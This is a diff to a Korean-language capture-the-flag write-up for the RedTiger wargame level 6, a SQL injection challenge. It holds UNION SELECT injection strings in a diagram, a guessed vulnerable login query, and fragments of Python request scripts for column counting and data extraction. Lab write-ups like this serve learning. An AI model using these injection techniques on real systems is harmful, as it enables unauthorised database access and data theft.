@@ -2,6 +2,8 @@
 [redtiger] level6
 ================================================================================================================
 
+|
+
 .. graphviz::
 
     digraph G {
@@ -20,46 +22,33 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
-        step0 -> step1[label="level6.php?user=0 union select %s from level6_users--",arrowhead="normal"];
-        step3 -> step2[label="column length",arrowhead="normal"];
-        step4 -> step5[label="level6.php?user=0 union select 1,(HEX문),3,4,5 from level6_users-- ",arrowhead="normal"];
-        step7 -> step6[label="@solve",arrowhead="normal"];
+        step0 -> step1[label="user=0 union select %s from level6_users--",arrowhead="normal"];
+        step3 -> step2[label="Column Length",arrowhead="normal"];
+        step4 -> step5[label="user=0 union select 1,@HEX,3,4,5 from level6_users-- ",arrowhead="normal"];
+        step7 -> step6[label="Data Extract",arrowhead="normal"];
     }
 
 |
 
-Source Analysis
+server -> DB 예측
 ================================================================================================================
 
-- Target: Get the first user in table level6_users with status 1
+- 테이블명: level6_users
+- POST 파라미터: user, password
 
+.. code-block:: sql
 
-
-.. code-block:: html
-
-    <a href="?user=1">Click me</a>
-    <table style="border-collapse:collapse; border:1px solid black;">
-    <tr>
-        <td>Username: </td>
-        <td>deddlef</td>
-    </tr>
-    <tr>
-        <td>Email: </td>
-        <td>dumbi@damibi.de</td>
-    </tr>
-    </table>
-
-    <form method="post">
-        Username: <input type="text" name="user">
-        Password: <input type="text" name="password">
-    <input type="submit" name="login" value="Login">
-    </form>
+    SELECT * FROM tb_name where 
+    user='$_POST["user"]' AND 
+    password='$_POST["password"]'
 
 
 |
 
-Column Length
+union select
 ================================================================================================================
+
+- 컬럼 개수 확인
 
 .. code-block:: python
 
@@ -90,9 +79,10 @@ Column Length
 
 |
 
-Data Extract
+union select
 ================================================================================================================
 
+- 데이터 추출
 
 .. code-block:: python
 
@@ -114,3 +104,5 @@ Data Extract
     r = requests.post(url, cookies=cookies, params=params, verify=False)
 
     print r.content
+
+|
